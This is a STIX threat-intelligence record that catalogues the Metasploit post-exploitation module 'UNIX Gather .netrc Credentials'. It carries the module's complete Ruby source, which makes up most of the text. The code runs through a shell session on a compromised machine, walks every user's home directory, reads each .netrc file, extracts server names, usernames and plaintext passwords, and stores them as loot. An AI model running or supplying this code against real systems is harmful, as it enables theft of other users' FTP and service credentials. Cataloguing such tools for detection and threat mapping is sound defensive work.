{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90da18d8-1370-4d43-b8f8-bd35de854187",
    "created": "2024-08-14T16:33:19.181376Z",
    "modified": "2024-08-14T16:33:19.181379Z",
    "name": "UNIX Gather .netrc Credentials",
    "description": " Post Module to obtain credentials saved for FTP and other services in .netrc  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/netrc_creds.rb",
            "external_id": "netrc_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather .netrc Credentials',\n        'Description' => %q{\n          Post Module to obtain credentials saved for FTP and other services in .netrc\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Jon Hart <jhart[at]spoofed.org>' ],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => [ 'shell' ]\n      )\n    )\n  end\n\n  def run\n    # A table to store the found credentials.\n    cred_table = Rex::Text::Table.new(\n      'Header' => '.netrc credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Username',\n        'Password',\n        'Server',\n      ]\n    )\n\n    # all of the credentials we've found from .netrc\n    creds = []\n\n    # walk through each user directory\n    print_status('Enumerating .netrc files')\n    enum_user_directories.each do |user_dir|\n      netrc_file = user_dir + '/.netrc'\n      # the current credential from .netrc we are parsing\n      cred = {}\n\n      # read their .netrc\n      unless readable? netrc_file\n        vprint_error(\"Couldn't read #{netrc_file}\")\n        next\n      end\n      print_status(\"Reading: #{netrc_file}\")\n      read_file(netrc_file).each_line do |netrc_line|\n        # parse it\n        netrc_line.strip!\n        # get the machine name\n        if (netrc_line =~ /machine (\\S+)/)\n          # if we've already found a machine, save this cred and start over\n          if (cred[:host])\n            creds << cred\n            cred = {}\n          end\n          cred[:host] = ::Regexp.last_match(1)\n        end\n        # get the user name\n        if (netrc_line =~ /login (\\S+)/)\n          cred[:user] = ::Regexp.last_match(1)\n        end\n        # get the password\n        if (netrc_line =~ /password (\\S+)/)\n          cred[:pass] = ::Regexp.last_match(1)\n        end\n      end\n\n      # save whatever remains of this last cred if it is worth saving\n      creds << cred if (cred[:host] && cred[:user] && cred[:pass])\n    end\n\n    # print out everything we've found\n    creds.each do |cred|\n      cred_table << [ cred[:user], cred[:pass], cred[:host] ]\n    end\n\n    if cred_table.rows.empty?\n      print_status('No creds collected')\n    else\n      print_line(\"\\n\" + cred_table.to_s)\n\n      # store all found credentials\n      p = store_loot(\n        'netrc.creds',\n        'text/csv',\n        session,\n        cred_table.to_csv,\n        'netrc_credentials.txt',\n        '.netrc credentials'\n      )\n\n      print_status(\"Credentials stored in: #{p}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}